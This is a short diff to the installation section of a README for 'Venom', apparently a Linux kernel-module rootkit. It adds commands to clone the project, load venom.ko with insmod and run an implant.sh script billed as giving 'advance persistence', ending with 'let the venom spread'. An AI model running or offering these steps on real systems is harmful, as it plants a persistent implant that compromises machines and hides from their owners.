@@ -39,12 +39,20 @@
 
 ## Installation
 
+
 ```bash
+# Insert the module
 git clone https://github.com/Trevohack/Venom
 cd Venom
 make
 insmod venom.ko
-``` 
+
+# Install with advance persistence
+git clone https://github.com/Trevohack/Venom
+cd Venom
+chmod +x implant.sh
+./implant.sh
+```
 
 - And let the venom spread 
 
